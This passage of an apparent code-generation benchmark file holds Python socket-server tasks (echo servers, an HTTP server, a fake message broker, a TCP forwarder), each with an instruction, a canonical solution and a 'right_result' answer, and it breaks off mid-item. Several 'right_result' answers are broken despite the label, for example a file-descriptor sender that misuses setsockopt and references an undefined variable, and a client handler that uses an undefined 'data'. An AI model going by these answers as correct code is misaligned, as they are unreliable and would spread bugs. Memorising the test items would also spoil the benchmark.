    "right_result": "import socket\nimport os\nimport fcntl\nimport struct\n\ndef send_fd(sock, fd):\n    # Set the socket to allow passing file descriptors\n    sock.setsockopt(socket.SOL_SOCKET, socket.SCM_RIGHTS, [fd])\n    # Send the file descriptor over the socket\n    sock.sendto(b'OK', (work_address, 0))\n\ndef server(work_address, port):\n    # Create a Unix domain socket for communication with the worker\n    work_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)\n    work_socket.bind(work_address)\n    \n    # Create a TCP server socket\n    tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    tcp_server.bind(('localhost', port))\n    tcp_server.listen(5)\n    \n    print(f\"Server listening on TCP port {port} and Unix socket {work_address}\")\n    \n    while True:\n        # Accept a TCP connection\n        client_socket, client_address = tcp_server.accept()\n        print(f\"Accepted connection from {client_address}\")\n        \n        # Get the file descriptor of the client socket\n        client_fd = client_socket.fileno()\n        \n        # Send the file descriptor to the worker via Unix domain socket\n        send_fd(work_socket, client_fd)\n        \n        # Close the client connection\n        client_socket.close()\n\nif __name__ == \"__main__\":\n    import sys\n    if len(sys.argv) != 3:\n        print(\"Usage: python server.py <work_address> <port>\")\n        sys.exit(1)\n    \n    work_address = sys.argv[1]\n    port = int(sys.argv[2])\n    server(work_address, port)"
  },
  {
    "Task_id": 401,
    "Instruction": "Task Description: Implement a multithreaded TCP echo server that receives data from a client, processes it, and sends it back to the client in chunks. The server should handle client connections in a separate thread and support graceful termination when receiving a \"QUIT\" command.\n\nClass Description: EchoServer is a threaded TCP server that echoes received data back to the client. It handles one client connection at a time, processes incoming data, and sends it back in configurable chunk sizes. The server can be configured to delay resending until triggered by an external event.\n\nAttributes:\n- host: str - The host IP address to bind the server to\n- port: int - The port number to listen on\n- sock: socket.socket - The TCP socket object for server operations\n- buffer: str - Accumulates received data before echoing back\n- start_resend_event: threading.Event - Optional event to trigger when to start echoing data back\n- chunk_size: int - Size of data chunks to send back to client (default: 1 byte)\n\nMethods:\n- __init__(host: str, port: int) -> None - Initializes the server with host and port\n- run() -> None - Main thread method that handles client connection, data reception, and echoing back data. Runs in a separate thread when started. Processes data until \"QUIT\" is received or connection is closed.",
    "Canonical_solution": "import socket\nimport threading\nimport time\n\nclass EchoServer(threading.Thread):\n    def __init__(self, host, port):\n        threading.Thread.__init__(self)\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.buffer = \"\"\n        self.start_resend_event = None\n        self.chunk_size = 1\n\n    def run(self):\n        self.sock.bind((self.host, self.port))\n        self.sock.listen(1)\n        conn, client = self.sock.accept()\n        \n        while True:\n            data = conn.recv(1)\n            if not data:\n                break\n            self.buffer += data\n            if \"QUIT\\n\" in self.buffer:\n                break\n\n        self.buffer = self.buffer.replace(\"QUIT\\n\", '')\n\n        if self.start_resend_event:\n            self.start_resend_event.wait()\n\n        try:\n            while self.buffer:\n                n = conn.send(self.buffer[:self.chunk_size])\n                time.sleep(0.001)\n                self.buffer = self.buffer[n:]\n        except:\n            pass\n\n        conn.close()\n        self.sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\n\nclass EchoServer:\n    def __init__(self, host: str, port: int) -> None:\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.buffer = \"\"\n        self.start_resend_event = threading.Event()\n        self.chunk_size = 1\n\n    def run(self) -> None:\n        self.sock.bind((self.host, self.port))\n        self.sock.listen(5)\n        print(f\"Server listening on {self.host}:{self.port}\")\n\n        while True:\n            client_sock, client_addr = self.sock.accept()\n            print(f\"Accepted connection from {client_addr}\")\n            client_thread = threading.Thread(target=self.handle_client, args=(client_sock,))\n            client_thread.start()\n\n    def handle_client(self, client_sock: socket.socket) -> None:\n        while True:\n            data = client_sock.recv(self.chunk_size)\n            if not data:\n                break\n            self.buffer += data.decode()\n            if self.start_resend_event.is_set():\n                self._send_data(client_sock)\n            else:\n                self._wait_for_resend_event(client_sock)\n\n            if \"QUIT\" in self.buffer:\n                break\n\n        client_sock.close()\n        print(\"Client connection closed\")\n\n    def _send_data(self, client_sock: socket.socket) -> None:\n        while self.buffer:\n            chunk = self.buffer[:self.chunk_size]\n            client_sock.send(chunk.encode())\n            self.buffer = self.buffer[self.chunk_size:]\n\n    def _wait_for_resend_event(self, client_sock: socket.socket) -> None:\n        self.start_resend_event.wait()\n        self.start_resend_event.clear()\n\nif __name__ == \"__main__\":\n    server = EchoServer(\"localhost\", 9999)\n    server.run()"
  },
  {
    "Task_id": 402,
    "Instruction": "Task Description: Implement a TCP server-client communication system in Python using socket programming and multiprocessing. The system should allow for asynchronous handling of client connections and bidirectional data exchange.\n\nClass Description: The system consists of two main classes: TCPServer for handling incoming connections and TCPClient for establishing connections to the server. The TCPServer runs in a separate process to handle client connections asynchronously.\n\nAttributes:\n- TCPServer:\n  - port: int - The port number on which the server listens for connections\n  - process: Process - The multiprocessing Process object running the server\n  - is_running: bool - Flag indicating whether the server is currently running\n\n- TCPClient:\n  - port: int - The port number to connect to on the server\n  - sock: socket - The TCP socket object for communication with the server\n\nMethods:\n- TCPServer:\n  - start() -> None - Starts the server in a separate process\n  - stop() -> None - Stops the server process\n  - _subprocess_server_tcp(port: int) -> None - Internal method running in the subprocess to handle client connections (accepts connections and echoes received data)\n\n- TCPClient:\n  - send(data: Union[str, bytes]) -> bytes - Sends data to the server and returns the response\n  - close() -> None - Closes the client connection\n  - __del__() -> None - Destructor that ensures proper connection cleanup",
    "Canonical_solution": "import socket\nfrom multiprocessing import Process\nimport os\nimport time\n\nclass TCPServer:\n    def __init__(self, port):\n        self.port = int(port)\n        self.process = None\n        self.is_running = False\n\n    def start(self):\n        args = [self.port]\n        self.process = Process(target=self._subprocess_server_tcp, args=args)\n        self.process.start()\n        time.sleep(1)\n        self.is_running = True\n\n    def stop(self):\n        try:\n            os.kill(self.process.pid, 9)\n        except OSError:\n            self.process.terminate()\n        finally:\n            self.is_running = False\n\n    def _subprocess_server_tcp(self, port):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.bind(('localhost', port))\n        s.listen(True)\n        conn, addr = s.accept()\n\n        while True:\n            data = conn.recv(1024)\n            conn.send(b\"RECEIVED: \" + bytes(data))\n\n        conn.close()\n\nclass TCPClient:\n    def __init__(self, port):\n        self.port = int(port)\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect(('localhost', self.port))\n\n    def send(self, data):\n        if isinstance(data, str):\n            data = data.encode('utf-8')\n\n        self.sock.sendall(data)\n        return self.sock.recv(len(data) + 11)\n\n    def close(self):\n        try:\n            self.sock.close()\n        except socket.error:\n            pass\n\n    def __del__(self):\n        self.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport multiprocessing\nfrom typing import Union\n\nclass TCPServer:\n    def __init__(self, port: int):\n        self.port = port\n        self.process = None\n        self.is_running = False\n\n    def start(self) -> None:\n        if not self.is_running:\n            self.process = multiprocessing.Process(target=self._subprocess_server_tcp, args=(self.port,))\n            self.process.start()\n            self.is_running = True\n\n    def stop(self) -> None:\n        if self.is_running:\n            self.process.terminate()\n            self.process.join()\n            self.is_running = False\n\n    def _subprocess_server_tcp(self, port: int) -> None:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\n            server_socket.bind(('localhost', port))\n            server_socket.listen(5)\n            print(f\"Server listening on port {port}\")\n            while self.is_running:\n                client_socket, addr = server_socket.accept()\n                print(f\"Connection from {addr}\")\n                with client_socket:\n                    while True:\n                        data = client_socket.recv(1024)\n                        if not data:\n                            break\n                        client_socket.sendall(data)\n                        print(f\"Received: {data.decode()}\")\n            print(\"Server stopped\")\n\nclass TCPClient:\n    def __init__(self, port: int):\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self) -> None:\n        self.sock.connect(('localhost', self.port))\n\n    def send(self, data: Union[str, bytes]) -> bytes:\n        if isinstance(data, str):\n            data = data.encode()\n        self.sock.sendall(data)\n        response = self.sock.recv(1024)\n        return response\n\n    def close(self) -> None:\n        self.sock.close()\n\n    def __del__(self) -> None:\n        self.close()"
  },
  {
    "Task_id": 404,
    "Instruction": "Task Description: Implement a simple HTTP server using TCP sockets in Python that can handle basic GET and HEAD requests, send appropriate responses, and stream data to connected clients.\n\nClass Description: HTTPServer is a TCP-based HTTP server implementation that handles incoming client connections, processes HTTP requests, and manages data streaming to clients.\n\nAttributes:\n- socket: [socket.socket] - The TCP socket object used for server operations\n- conn: [socket.socket] - The active client connection socket\n- host: [str] - The server's host address (None if bound to all interfaces)\n- port: [int] - The server's listening port\n- bound: [bool] - Flag indicating whether the server is bound to an address\n\nMethods:\n- bind(host=\"127.0.0.1\", port=0) -> None - Binds the server to the specified host and port. If port is 0, uses an available port. Sets up listening socket.\n- open(timeout=30) -> HTTPRequest - Accepts an incoming connection, processes the HTTP request, and returns the parsed request object. Times out after specified seconds.\n- write(data) -> None - Sends data to the connected client. Raises IOError if no active connection.\n- close(client_only=False) -> None - Closes the client connection and optionally the server socket. If client_only is True, keeps server socket open.\n\nHelper Class Description: HTTPRequest is used to parse incoming HTTP requests from raw request text.\n\nAttributes:\n- rfile: [BytesIO] - Buffer containing the request data\n- raw_requestline: [bytes] - The first line of the HTTP request\n- error_code: [int] - Error code if request parsing failed\n- error_message: [str] - Error message if request parsing failed\n- command: [str] - The HTTP method (e.g., \"GET\", \"HEAD\") from parsed request\n\nMethods:\n- parse_request() -> None - Parses the HTTP request (inherited from BaseHTTPRequestHandler)\n- send_error(code, message) -> None - Stores error information when request parsing fails",
    "Canonical_solution": "import socket\nfrom io import BytesIO\ntry:\n    from BaseHTTPServer import BaseHTTPRequestHandler\nexcept ImportError:\n    from http.server import BaseHTTPRequestHandler\n\nclass HTTPRequest(BaseHTTPRequestHandler):\n    def __init__(self, request_text):\n        self.rfile = BytesIO(request_text)\n        self.raw_requestline = self.rfile.readline()\n        self.error_code = self.error_message = None\n        self.parse_request()\n\n    def send_error(self, code, message):\n        self.error_code = code\n        self.error_message = message\n\nclass HTTPServer:\n    def __init__(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.conn = self.host = self.port = None\n        self.bound = False\n\n    def bind(self, host=\"127.0.0.1\", port=0):\n        try:\n            self.socket.bind((host or \"\", port))\n        except socket.error as err:\n            raise OSError(err)\n\n        self.socket.listen(1)\n        self.bound = True\n        self.host, self.port = self.socket.getsockname()\n        if self.host == \"0.0.0.0\":\n            self.host = None\n\n    def open(self, timeout=30):\n        self.socket.settimeout(timeout)\n\n        try:\n            conn, addr = self.socket.accept()\n            conn.settimeout(None)\n        except socket.timeout:\n            raise OSError(\"Socket accept timed out\")\n\n        try:\n            req_data = conn.recv(1024)\n        except socket.error:\n            raise OSError(\"Failed to read data from socket\")\n\n        req = HTTPRequest(req_data)\n        if req.command not in (\"GET\", \"HEAD\"):\n            conn.send(b\"HTTP/1.1 501 Not Implemented\\r\\n\")\n            conn.close()\n            raise OSError(\"Invalid request method: {0}\".format(req.command))\n\n        try:\n            conn.send(b\"HTTP/1.1 200 OK\\r\\n\")\n            conn.send(b\"Server: Livestreamer\\r\\n\")\n            conn.send(b\"Content-Type: video/unknown\\r\\n\")\n            conn.send(b\"\\r\\n\")\n        except socket.error:\n            raise OSError(\"Failed to write data to socket\")\n\n        if req.command == \"HEAD\":\n            conn.close()\n            raise OSError\n\n        self.conn = conn\n        return req\n\n    def write(self, data):\n        if not self.conn:\n            raise IOError(\"No connection\")\n        self.conn.sendall(data)\n\n    def close(self, client_only=False):\n        if self.conn:\n            self.conn.close()\n        if not client_only:\n            self.socket.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nfrom io import BytesIO\n\nclass HTTPServer:\n    def __init__(self):\n        self.socket = None\n        self.conn = None\n        self.host = None\n        self.port = 0\n        self.bound = False\n\n    def bind(self, host=\"127.0.0.1\", port=0):\n        self.host = host\n        self.port = port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        if port == 0:\n            self.socket.bind((host, 0))\n        else:\n            self.socket.bind((host, port))\n        self.bound = True\n        self.socket.listen(5)\n\n    def open(self, timeout=30):\n        self.conn, addr = self.socket.accept()\n        self.conn.settimeout(timeout)\n        rfile = BytesIO()\n        while True:\n            try:\n                data = self.conn.recv(4096)\n                if not data:\n                    break\n                rfile.write(data)\n            except socket.error:\n                break\n        rfile.seek(0)\n        return HTTPRequest(rfile)\n\n    def write(self, data):\n        if self.conn is None:\n            raise IOError(\"No active connection\")\n        self.conn.sendall(data)\n\n    def close(self, client_only=False):\n        if self.conn is not None:\n            self.conn.close()\n            self.conn = None\n        if not client_only and self.socket is not None:\n            self.socket.close()\n            self.socket = None\n\n\nclass HTTPRequest:\n    def __init__(self, rfile):\n        self.rfile = rfile\n        self.raw_requestline = b''\n        self.error_code = 0\n        self.error_message = ''\n        self.command = ''\n\n    def parse_request(self):\n        self.raw_requestline = self.rfile.readline()\n        if not self.raw_requestline:\n            self.send_error(400, \"Bad Request\")\n            return\n        parts = self.raw_requestline.split(b' ', 2)\n        if len(parts) < 2:\n            self.send_error(400, \"Bad Request\")\n            return\n        self.command = parts[0].decode('utf-8')\n        self.path = parts[1].decode('utf-8')\n        self.version = parts[2].decode('utf-8') if len(parts) > 2 else 'HTTP/1.1'\n\n    def send_error(self, code, message):\n        self.error_code = code\n        self.error_message = message"
  },
  {
    "Task_id": 405,
    "Instruction": "Task Description: Create a TCP server implementation in Python that can handle client connections, send/receive data, and manage socket resources properly. The implementation should support both TCP and Unix domain sockets, with proper error handling and cleanup.\n\nClass Description: FakeBroker is a class that simulates a message broker server capable of handling client connections over TCP or Unix domain sockets. It provides methods to start listening, accept connections, send/receive data, and clean up resources.\n\nAttributes:\n- _sock: [socket.socket] - The underlying socket object used for listening\n- _conn: [socket.socket] - The active client connection socket\n- port: [int] - The port number the server is bound to (for TCP)\n- transport: [str] - The transport type ('tcp' or 'unix')\n\nMethods:\n- __init__(transport: str = \"tcp\") -> None - Initializes the server with specified transport type (TCP or Unix domain socket)\n- start() -> None - Starts listening and accepts a client connection\n- finish() -> None - Closes all connections and cleans up resources\n- receive_packet(num_bytes: int) -> bytes - Receives specified number of bytes from client\n- send_packet(packet_out: bytes) -> int - Sends data to the connected client, returns number of bytes sent\n\nTask Description: Create a threaded TCP server implementation in Python that can handle multiple client connections simultaneously using Python's socketserver framework.\n\nClass Description: FakeWebsocketBroker is a threaded TCP server implementation that extends threading.Thread to run a server in a separate thread. It uses ThreadedTCPServer to handle multiple client connections concurrently.\n\nAttributes:\n- host: [str] - The host address to bind to (default 'localhost')\n- port: [int] - The port number the server is bound to\n- _server: [ThreadedTCPServer] - The underlying threaded TCP server instance\n- _running: [bool] - Flag indicating if the server is running\n- handler_cls: [bool/class] - The request handler class for the server\n\nMethods:\n- __init__() -> None - Initializes the threaded server\n- serve(tcphandler: class) -> contextmanager - Context manager that starts the server with given handler class\n- run() -> None - Thread entry point that starts serving requests",
    "Canonical_solution": "import socket\nimport os\nimport threading\nimport socketserver\n\nclass FakeBroker:\n    def __init__(self, transport=\"tcp\"):\n        if transport == \"tcp\":\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            sock.bind((\"localhost\", 0))\n            self.port = sock.getsockname()[1]\n        elif transport == \"unix\":\n            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n            sock.bind(\"localhost\")\n            self.port = 1883\n        else:\n            raise ValueError(f\"unsupported transport {transport}\")\n\n        sock.settimeout(5)\n        sock.listen(1)\n\n        self._sock = sock\n        self._conn = None\n        self.transport = transport\n\n    def start(self):\n        if self._sock is None:\n            raise ValueError('Socket is not open')\n\n        (conn, address) = self._sock.accept()\n        conn.settimeout(5)\n        self._conn = conn\n\n    def finish(self):\n        if self._conn is not None:\n            self._conn.close()\n            self._conn = None\n\n        if self._sock is not None:\n            self._sock.close()\n            self._sock = None\n\n        if self.transport == 'unix':\n            try:\n                os.unlink('localhost')\n            except OSError:\n                pass\n\n    def receive_packet(self, num_bytes):\n        if self._conn is None:\n            raise ValueError('Connection is not open')\n\n        packet_in = self._conn.recv(num_bytes)\n        return packet_in\n\n    def send_packet(self, packet_out):\n        if self._conn is None:\n            raise ValueError('Connection is not open')\n\n        count = self._conn.send(packet_out)\n        return count\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    pass\n\nclass FakeWebsocketBroker(threading.Thread):\n    def __init__(self):\n        super().__init__()\n        self.host = \"localhost\"\n        self.port = -1\n        self._server = None\n        self._running = True\n        self.handler_cls = False\n\n    @contextlib.contextmanager\n    def serve(self, tcphandler):\n        self._server = ThreadedTCPServer((self.host, 0), tcphandler)\n        try:\n            self.start()\n            self.port = self._server.server_address[1]\n            if not self._running:\n                raise RuntimeError(\"Error starting server\")\n            yield\n        finally:\n            if self._server:\n                self._server.shutdown()\n                self._server.server_close()\n\n    def run(self):\n        self._running = True\n        self._server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\nfrom socketserver import ThreadingTCPServer, BaseRequestHandler\n\nclass FakeBroker:\n    def __init__(self, transport: str = \"tcp\"):\n        self._sock = None\n        self._conn = None\n        self.port = 0\n        self.transport = transport\n\n    def start(self):\n        if self.transport == \"tcp\":\n            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            self._sock.bind(('localhost', self.port))\n            self._sock.listen(5)\n            self._conn, addr = self._sock.accept()\n        elif self.transport == \"unix\":\n            self._sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n            self._sock.bind('fake_socket.sock')\n            self._sock.listen(5)\n            self._conn, addr = self._sock.accept()\n        else:\n            raise ValueError(\"Invalid transport type. Use 'tcp' or 'unix'.\")\n\n    def finish(self):\n        if self._conn:\n            self._conn.close()\n        if self._sock:\n            self._sock.close()\n\n    def receive_packet(self, num_bytes: int) -> bytes:\n        data = self._conn.recv(num_bytes)\n        if not data:\n            self.finish()\n            raise ConnectionError(\"Connection closed by client\")\n        return data\n\n    def send_packet(self, packet_out: bytes) -> int:\n        return self._conn.send(packet_out)\n\nclass FakeWebsocketBroker(BaseRequestHandler):\n    def handle(self):\n        data = self.request.recv(1024)\n        self.request.sendall(data)\n\nclass ThreadedTCPServer(ThreadingTCPServer):\n    pass\n\nclass FakeWebsocketBrokerServer:\n    def __init__(self, host='localhost', port=9999):\n        self.host = host\n        self.port = port\n        self._server = ThreadedTCPServer((self.host, self.port), FakeWebsocketBroker)\n        self._running = False\n        self.handler_cls = FakeWebsocketBroker\n\n    def serve(self, tcphandler):\n        self._server = ThreadedTCPServer((self.host, self.port), tcphandler)\n        self._running = True\n        thread = threading.Thread(target=self._server.serve_forever)\n        thread.start()\n        yield\n        self._running = False\n        self._server.shutdown()\n        thread.join()\n\n    def run(self):\n        self._server.serve_forever()"
  },
  {
    "Task_id": 406,
    "Instruction": "Task Description: Implement a TCP forwarding server that acts as an intermediary between client connections and a remote device, facilitating bidirectional communication between them.\n\nClass Description: TCPForwardServer is a class that establishes a TCP server to forward traffic between connected clients and a remote device. It manages multiple client connections simultaneously using select-based I/O multiplexing and maintains channel mappings between client and device sockets.\n\nAttributes:\n- input_list: List[socket.socket] - List of sockets being monitored for incoming data\n- channel: Dict[socket.socket, socket.socket] - Mapping between client and device sockets\n- _server: socket.socket - The main server socket accepting client connections\n- _rdev: Device - The remote device to connect to\n- _rport: int - The port number on the remote device\n- BUFFER_SIZE: int - Size of the data buffer for socket operations\n- DELAY: float - Delay between select operations in seconds\n\nMethods:\n- __init__(lhost: str, lport: int, rdev: Device, rport: int) -> None - Initializes the TCP forwarding server with local host/port and remote device/port information\n- main_loop() -> None - Main server loop that handles incoming connections and data using select\n- on_accept() -> None - Handles new client connections and establishes corresponding device connections\n- on_close() -> None - Cleans up resources when a connection is closed\n- on_recv() -> None - Handles incoming data by forwarding it to the corresponding channel",
    "Canonical_solution": "import socket\nimport select\nimport time\nfrom typing import Dict\n\nclass TCPForwardServer:\n    def __init__(self, lhost: str, lport: int, rdev: Device, rport: int):\n        self.input_list = []\n        self.channel: Dict[socket.socket, socket.socket] = {}\n        \n        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self._server.bind((lhost, lport))\n        self._server.listen(200)\n        self._rdev = rdev\n        self._rport = rport\n        self.BUFFER_SIZE = 4096\n        self.DELAY = 0.0001\n    \n    def main_loop(self):\n        self.input_list.append(self._server)\n        while True:\n            time.sleep(self.DELAY)\n            inputready, _, _ = select.select(self.input_list, [], [])\n            for self.s in inputready:\n                if self.s == self._server:\n                    self.on_accept()\n                    break\n                self.data = self.s.recv(self.BUFFER_SIZE)\n                if len(self.data) == 0:\n                    self.on_close()\n                else:\n                    self.on_recv()\n\n    def on_accept(self):\n        try:\n            sock_proxy = self._rdev.create_inner_connection(self._rport)\n            devicesock = sock_proxy.get_socket()\n        except Exception:\n            devicesock = None\n\n        clientsock, clientaddr = self._server.accept()\n        if devicesock:\n            print(clientaddr, \"has connected\")\n            self.input_list.append(clientsock)\n            self.input_list.append(devicesock)\n            self.channel[clientsock] = devicesock\n            self.channel[devicesock] = clientsock\n        else:\n            print(\"Can't establish connection with device inner server.\")\n            print(\"Closing connection with client side\", clientaddr)\n            clientsock.close()\n        \n    def on_close(self):\n        print(self.s.getpeername(), \"has disconnected\")\n        self.input_list.remove(self.s)\n        self.input_list.remove(self.channel[self.s])\n        out = self.channel[self.s]\n        self.channel[out].close()\n        self.channel[self.s].close()\n        del self.channel[out]\n        del self.channel[self.s]\n    \n    def on_recv(self):\n        data = self.data\n        self.channel[self.s].send(data)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport select\nimport time\n\nclass Device:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n\n    def connect(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((self.host, self.port))\n\n    def send(self, data):\n        self.sock.sendall(data)\n\n    def recv(self, buffer_size):\n        return self.sock.recv(buffer_size)\n\nclass TCPForwardServer:\n    BUFFER_SIZE = 4096\n    DELAY = 0.1\n\n    def __init__(self, lhost: str, lport: int, rdev: Device, rport: int) -> None:\n        self.input_list = []\n        self.channel = {}\n        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._server.bind((lhost, lport))\n        self._server.listen(5)\n        self._rdev = rdev\n        self._rport = rport\n        self._rdev.connect()\n\n    def main_loop(self) -> None:\n        self.input_list.append(self._server)\n        while True:\n            readable, _, _ = select.select(self.input_list, [], [])\n            for sock in readable:\n                if sock == self._server:\n                    client, addr = self._server.accept()\n                    self.input_list.append(client)\n                    self.channel[client] = self._rdev.sock\n                elif sock in self.channel:\n                    data = sock.recv(self.BUFFER_SIZE)\n                    if data:\n                        self.on_recv(data, sock)\n                    else:\n                        self.on_close(sock)\n            time.sleep(self.DELAY)\n\n    def on_accept(self) -> None:\n        pass\n\n    def on_close(self, sock: socket.socket) -> None:\n        if sock in self.channel:\n            del self.channel[sock]\n        self.input_list.remove(sock)\n        sock.close()\n\n    def on_recv(self, data: bytes, sock: socket.socket) -> None:\n        if sock in self.channel:\n            self.channel[sock].send(data)"
  },
  {
    "Task_id": 407,
    "Instruction": "Task Description: Implement a TCP server using Python's socket module with asynchronous I/O operations managed by a custom scheduler. The server should handle multiple client connections, echo received data back to clients, and properly manage socket resources.\n\nClass Description: The implementation consists of several classes that work together to create an asynchronous TCP server. The main classes include Socket (a wrapper for socket operations), ReadSocket/WriteSocket/AcceptSocket (operation handlers), and EchoServer (the main server logic).\n\nAttributes:\n\n- Socket._sock: socket.socket - The underlying socket object being wrapped\n- ReadSocket.sock: socket.socket - The socket to read from\n- ReadSocket.nbytes: int - Maximum bytes to read\n- WriteSocket.sock: socket.socket - The socket to write to\n- WriteSocket.data: bytes - Data to be sent\n- AcceptSocket.sock: socket.socket - The socket to accept connections from\n- EchoServer.sched: object - The scheduler instance managing tasks\n\nMethods:\n\n- Socket.__init__(sock: socket.socket) -> None - Initialize with a socket object\n- Socket.recv(maxbytes: int) -> ReadSocket - Create a read operation\n- Socket.send(data: bytes) -> WriteSocket - Create a write operation\n- Socket.accept() -> AcceptSocket - Create an accept operation\n- Socket.__getattr__(name: str) -> Any - Proxy attribute access to underlying socket\n- ReadSocket.handle_yield(sched: object, task: object) -> None - Register read operation with scheduler\n- ReadSocket.handle_resume(sched: object, task: object) -> None - Complete read operation\n- WriteSocket.handle_yield(sched: object, task: object) -> None - Register write operation with scheduler\n- WriteSocket.handle_resume(sched: object, task: object) -> None - Complete write operation\n- AcceptSocket.handle_yield(sched: object, task: object) -> None - Register accept operation with scheduler\n- AcceptSocket.handle_resume(sched: object, task: object) -> None - Complete accept operation\n- EchoServer.__init__(addr: tuple, sched: object) -> None - Initialize server with address and scheduler\n- EchoServer.server_loop(addr: tuple) -> generator - Main server loop accepting connections\n- EchoServer.client_handler(client: Socket) -> generator - Handle client communication",
    "Canonical_solution": "from collections import deque\nfrom select import select\nfrom socket import socket, AF_INET, SOCK_STREAM\n\nclass Socket:\n    def __init__(self, sock):\n        self._sock = sock\n    \n    def recv(self, maxbytes):\n        return ReadSocket(self._sock, maxbytes)\n    \n    def send(self, data):\n        return WriteSocket(self._sock, data)\n    \n    def accept(self):\n        return AcceptSocket(self._sock)\n    \n    def __getattr__(self, name):\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock, nbytes):\n        self.sock = sock\n        self.nbytes = nbytes\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        data = self.sock.recv(self.nbytes)\n        sched.add_ready(task, data)\n\nclass WriteSocket:\n    def __init__(self, sock, data):\n        self.sock = sock\n        self.data = data\n    \n    def handle_yield(self, sched, task):\n        sched._write_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        nsent = self.sock.send(self.data)\n        sched.add_ready(task, nsent)\n\nclass AcceptSocket:\n    def __init__(self, sock):\n        self.sock = sock\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        r = self.sock.accept()\n        sched.add_ready(task, r)\n\nclass EchoServer:\n    def __init__(self, addr, sched):\n        self.sched = sched\n        sched.new(self.server_loop(addr))\n    \n    def server_loop(self, addr):\n        s = Socket(socket(AF_INET, SOCK_STREAM))\n        s.bind(addr)\n        s.listen(5)\n        while True:\n            c, a = yield s.accept()\n            print('Got connection from', a)\n            self.sched.new(self.client_handler(Socket(c)))\n    \n    def client_handler(self, client):\n        while True:\n            line = yield from readline(client)\n            if not line:\n                break\n            line = b'GOT:' + line\n            while line:\n                nsent = yield client.send(line)\n                line = line[nsent:]\n        client.close()\n        print('Client closed')",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport select\n\nclass Socket:\n    def __init__(self, sock):\n        self._sock = sock\n\n    def recv(self, maxbytes):\n        return ReadSocket(self._sock, maxbytes)\n\n    def send(self, data):\n        return WriteSocket(self._sock, data)\n\n    def accept(self):\n        return AcceptSocket(self._sock)\n\n    def __getattr__(self, name):\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock, nbytes):\n        self.sock = sock\n        self.nbytes = nbytes\n\n    def handle_yield(self, sched, task):\n        sched.register_read(self.sock, task)\n\n    def handle_resume(self, sched, task):\n        data = self.sock.recv(self.nbytes)\n        if data:\n            task.set_result(data)\n        else:\n            task.set_result(None)\n\nclass WriteSocket:\n    def __init__(self, sock, data):\n        self.sock = sock\n        self.data = data\n\n    def handle_yield(self, sched, task):\n        sched.register_write(self.sock, task)\n\n    def handle_resume(self, sched, task):\n        self.sock.send(self.data)\n        task.set_result(None)\n\nclass AcceptSocket:\n    def __init__(self, sock):\n        self.sock = sock\n\n    def handle_yield(self, sched, task):\n        sched.register_accept(self.sock, task)\n\n    def handle_resume(self, sched, task):\n        client, addr = self.sock.accept()\n        task.set_result(Socket(client))\n\nclass EchoServer:\n    def __init__(self, addr, sched):\n        self.sched = sched\n        self.addr = addr\n\n    def server_loop(self, addr):\n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        server.bind(addr)\n        server.listen(5)\n        self.sched.register_accept(server, self.client_handler)\n\n    def client_handler(self, client):\n        sock = Socket(client)\n        yield from sock.recv(1024)\n        yield from sock.send(b'Echo: ' + data)\n        yield from sock.close()\n\nclass Scheduler:\n    def __init__(self):\n        self.reads = []\n        self.writes = []\n        self.accepts = []\n\n    def register_read(self, sock, task):\n        self.reads.append((sock, task))\n\n    def register_write(self, sock, task):\n        self.writes.append((sock, task))\n\n    def register_accept(self, sock, task):\n        self.accepts.append((sock, task))\n\n    def run(self):\n        while self.reads or self.writes or self.accepts:\n            for sock, task in self.reads:\n                try:\n                    data = sock.recv(1024)\n                    if data:\n                        task.set_result(data)\n                    else:\n                        task.set_result(None)\n                except Exception as 